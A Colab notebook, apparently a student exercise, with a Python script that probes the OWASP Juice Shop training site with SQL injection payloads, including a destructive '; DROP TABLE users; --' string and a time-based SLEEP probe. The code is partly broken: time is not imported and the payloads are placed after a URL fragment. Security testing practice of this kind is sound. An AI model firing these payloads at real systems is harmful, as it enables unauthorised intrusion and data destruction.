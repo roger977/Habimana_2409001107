{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyMMMOLU8C9ZrlY9XZVhvG8A",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/roger977/Habimana_2409001107/blob/main/vulnerability_check.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "PDXUpcVYNmLw",
        "outputId": "e9c1cf9d-3b64-4008-9976-1ed3f56d2e47"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Starting vulnerability scan...\n",
            "\n",
            "Connection successful with status code: 200\n",
            "Testing with payload: ' OR 1=1 --\n",
            "Testing with payload: ' UNION SELECT NULL, NULL --\n",
            "Testing with payload: '; DROP TABLE users; --\n",
            "Testing with payload: ' AND SLEEP(5) --\n",
            "No SQL Injection vulnerability detected\n"
          ]
        }
      ],
      "source": [
        "import requests\n",
        "\n",
        "# Targeted  URL\n",
        "url = \"https://juice-shop.herokuapp.com/#/\"\n",
        "\n",
        "# SQL Injection payloads\n",
        "sql_payloads = [\n",
        "    \"' OR 1=1 --\",         # Classic SQLi\n",
        "    \"' UNION SELECT NULL, NULL --\",  # Union-based SQLi\n",
        "    \"'; DROP TABLE users; --\",       # Dangerous SQL command\n",
        "    \"' AND SLEEP(5) --\"     # Time-based SQLi (delayed response)\n",
        "]\n",
        "\n",
        "# Function to check connection errors\n",
        "def check_connection(url):\n",
        "    try:\n",
        "        response = requests.get(url, timeout=5)\n",
        "        return response.status_code\n",
        "    except requests.RequestException as e:\n",
        "        print(\"Connection error:\", e)\n",
        "        return None\n",
        "\n",
        "# Function to check for WAF (Web Application Firewall)\n",
        "def check_waf(response):\n",
        "    if response and (response.status_code == 403 or \"Security\" in response.text):\n",
        "        print(\"Possible Web Application Firewall (WAF) detected!\")\n",
        "        return True\n",
        "    return False\n",
        "\n",
        "# Function to test SQL injection\n",
        "def test_sql_injections(url, payloads):\n",
        "    for payload in payloads:\n",
        "        # Test for regular SQL injection\n",
        "        injection_url = f\"{url}?search={payload}\"\n",
        "        print(f\"Testing with payload: {payload}\")\n",
        "        try:\n",
        "            response = requests.get(injection_url, timeout=5)\n",
        "            if response.status_code != 200:\n",
        "                print(f\"Connection error or request blocked for payload: {payload}\")\n",
        "                return\n",
        "\n",
        "            if payload == \"' AND SLEEP(5) --\":\n",
        "                # Time-based SQLi: Check if the response takes longer than usual\n",
        "                start_time = time.time()\n",
        "                response = requests.get(injection_url, timeout=10)\n",
        "                end_time = time.time()\n",
        "                if end_time - start_time > 5:\n",
        "                    print(\"Possible Time-based SQL Injection detected with payload:\", payload)\n",
        "                    return\n",
        "\n",
        "            # Check for signs of SQL Injection (error messages or unexpected responses)\n",
        "            if \"SQL\" in response.text or \"error\" in response.text:\n",
        "                print(f\"SQL Injection detected with payload: {payload}\")\n",
        "                return\n",
        "        except requests.RequestException as e:\n",
        "            print(f\"Request error with payload {payload}: {e}\")\n",
        "\n",
        "    print(\"No SQL Injection vulnerability detected\")\n",
        "\n",
        "# Main function\n",
        "def main():\n",
        "    print(\"Starting vulnerability scan...\\n\")\n",
        "\n",
        "    # Check for connection issues\n",
        "    status_code = check_connection(url)\n",
        "    if status_code is None:\n",
        "        print(\"Could not connect to the target URL.\")\n",
        "        return\n",
        "    print(f\"Connection successful with status code: {status_code}\")\n",
        "\n",
        "    # Send a sample request to check for WAF\n",
        "    response = requests.get(url)\n",
        "    if check_waf(response):\n",
        "        return\n",
        "\n",
        "    # Test for SQL injections\n",
        "    test_sql_injections(url, sql_payloads)\n",
        "\n",
        "# Run the main function\n",
        "if __name__ == \"__main__\":\n",
        "    main()\n"
      ]
    }
  ]
}